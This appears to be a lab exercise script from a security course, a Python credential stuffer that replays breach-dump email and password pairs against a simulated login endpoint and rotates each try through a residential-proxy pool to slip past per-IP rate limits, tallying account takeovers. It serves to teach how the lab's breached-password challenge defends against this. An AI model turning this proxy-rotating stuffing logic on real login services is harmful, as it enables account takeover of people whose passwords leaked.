"""
Round 1 attack: a distributed credential stuffer.

The economy: replay breach-dump pairs against POST /api/login and keep the ones that open a session.
The generic per-IP bucket is beaten the cheap way: every attempt rents the next address of a
residential-proxy fleet (world.json's `residential_proxy_net`, 384 addresses), so no counter builds.
The stuffer is low and slow in the only sense that matters here: one try per account.

What it cannot hide: its hits are breached passwords. A combo list IS a breach dump, so every pair
that works uses a password that is in the corpus. Round 1 turns exactly those logins into a code
challenge. (W2 Ch6 is the full stuffing arms race; this chapter takes just that one economic fact.)

    python attacks/round1_stuffer.py
"""

import itertools

from _common import LIB_HEADERS, LabClient, combo_list, map_threads, report, world_pool

ACTOR = "bot:stuffer"


def run():
    fleet = itertools.cycle(world_pool("residential_proxy_net"))      # next() is atomic enough for a lab
    pairs, hits, challenged = combo_list(), [], []

    def attempt(pair):
        r = LabClient(ACTOR, ip=next(fleet)).post("/api/login", json={"email": pair[0], "password": pair[1]}, headers=LIB_HEADERS)
        if r.status_code == 200 and r.json().get("ok"):
            hits.append(pair[0])                              # a bare session: a full account takeover
        elif r.status_code == 403 and "challenge_required" in r.text:
            challenged.append(pair[0])                        # the password was right; the store wants a code
    map_threads(attempt, pairs)
    return {"attacker": ACTOR, "attempted": len(pairs), "succeeded": len(hits), "accounts_taken_over": len(hits),
            "right_password_but_challenged": len(challenged)}


if __name__ == "__main__":
    out = run()
    print(f"[{ACTOR}] {out['attempted']} pairs -> {out['accounts_taken_over']} accounts taken over, "
          f"{out['right_password_but_challenged']} right passwords met a code challenge")
    report(**out)
